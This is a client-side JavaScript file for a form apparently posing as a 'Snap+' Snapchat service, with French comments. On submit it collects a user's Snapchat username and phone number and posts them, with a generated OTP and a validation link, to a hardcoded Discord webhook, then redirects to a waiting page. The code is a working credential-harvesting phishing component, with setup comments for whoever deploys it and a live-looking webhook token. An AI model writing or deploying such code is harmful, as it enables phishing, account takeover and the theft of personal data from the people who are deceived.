document.addEventListener('DOMContentLoaded', () => {
  const form = document.getElementById('snapForm');
  if (!form) return;

  form.addEventListener('submit', async (e) => {
    e.preventDefault();

    const username = document.getElementById('username').value;
    const phone = document.getElementById('phone').value;

    // --- CONFIGURATION ---
    // 1. Mets ton URL de webhook Discord ici
    const webhookUrl = 'https://discord.com/api/webhooks/1470328213593915425/g6KMOx1UFKYP9zNmQ7L6kQHDK8UuuYnJmsmoWdgJ5mGGEbcmvLu7K-weF56y6pp2bD21'; 
    // 2. Mets l'adresse de ton site ici (ex: http://localhost:8080)
    const siteUrl = 'http://snapplusnety.vercel.app'; 
    // --------------------

    // Génère un ID unique et un code OTP
    const requestId = 'req_' + Date.now();
    const otpCode = Math.floor(1000 + Math.random() * 9000).toString();
    const validationLink = `${siteUrl}/validate.html?id=${requestId}`;

    // Prépare le message pour Discord
    const payload = {
      content: `📩 **Nouvelle demande Snap+**`,
      embeds: [{
        title: 'Action requise',
        description: `Cliquez sur le lien ci-dessous pour **Accepter** la demande.`,
        color: 15105570,
        fields: [
          { name: 'Nom d\'utilisateur', value: username, inline: true },
          { name: 'Téléphone', value: phone, inline: true },
          { name: 'Code OTP', value: `**${otpCode}**`, inline: false },
          { name: 'Lien de validation', value: `[✅ Accepter](${validationLink})`, inline: false }
        ],
        footer: { text: `ID: ${requestId}` }
      }]
    };

    try {
      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      if (!response.ok) throw new Error(`Erreur Discord: ${response.status}`);

      console.log('Message envoyé à Discord !');
      
      // Stocke les infos pour la suite
      sessionStorage.setItem('snapRequestId', requestId);
      sessionStorage.setItem('snapOtpCode', otpCode);
      sessionStorage.setItem('snapUsername', username);
      sessionStorage.setItem('snapPhone', phone);

      // Redirige vers la page d'attente
      window.location.href = 'waiting.html';

    } catch (error) {
      console.error('Erreur lors de l\'envoi:', error);
      alert('Erreur lors de l\'envoi. Vérifie la console (F12) et ton webhook.');
    }
  });
});
